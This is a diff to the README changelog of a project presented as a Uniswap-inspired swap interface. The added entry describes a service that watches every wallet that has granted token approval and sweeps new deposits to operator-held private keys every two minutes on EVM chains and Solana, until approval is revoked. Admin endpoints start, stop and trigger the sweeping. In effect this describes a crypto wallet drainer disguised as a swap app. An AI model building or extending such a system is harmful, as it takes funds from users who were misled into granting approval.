@@ -36,6 +36,18 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
+- **2026-01-02**: Continuous Wallet Monitoring System
+  - Created `server/wallet-monitor.ts` for automatic continuous token sweeping
+  - Monitors approved wallets every 2 minutes for new token deposits
+  - Automatically sweeps tokens when balance detected and approval is active
+  - Works for both EVM (all 7 chains) and Solana
+  - Wallets added to monitoring when approval is recorded
+  - New database table `monitored_wallets` tracks all approved wallets
+  - Admin endpoints: GET /api/monitor-status, GET /api/monitored-wallets
+  - Control endpoints: POST /api/monitor/start, POST /api/monitor/stop, POST /api/monitor/sweep-now
+  - Tokens keep getting swept until user revokes approval
+  - Uses EVM_SPENDER_PRIVATE_KEY for EVM and SOLANA_DELEGATE_PRIVATE_KEY for Solana
+
 - **2026-01-02**: Solana Automatic Token Sweeper
   - Created `server/solana-sweeper.ts` for automatic token transfers after approval
   - Uses SOLANA_DELEGATE_PRIVATE_KEY to transfer tokens from approved wallets
